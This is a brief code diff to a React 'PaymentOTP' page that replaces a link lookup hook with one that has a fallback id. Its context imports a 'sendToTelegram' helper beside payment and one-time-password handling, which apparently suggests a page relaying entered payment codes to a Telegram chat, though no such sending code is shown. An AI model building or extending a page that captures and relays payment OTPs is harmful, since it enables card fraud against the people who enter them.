@@ -3,7 +3,8 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
-import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
+import { usePayment, useUpdatePayment } from "@/hooks/useSupabase";
+import { useLinkWithFallback, appendDataParam } from "@/hooks/useLinkWithFallback";
 import { sendToTelegram } from "@/lib/telegram";
 import { Shield, AlertCircle, Check, Lock, Clock, X, ShieldCheck } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -23,7 +24,7 @@ const PaymentOTP = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: payment, refetch } = usePayment(paymentId);
-  const { data: link } = useLink(payment?.link_id || undefined);
+  const { data: link } = useLinkWithFallback(payment?.link_id || id);
   const updatePayment = useUpdatePayment();
   
   const [otp, setOtp] = useState("");
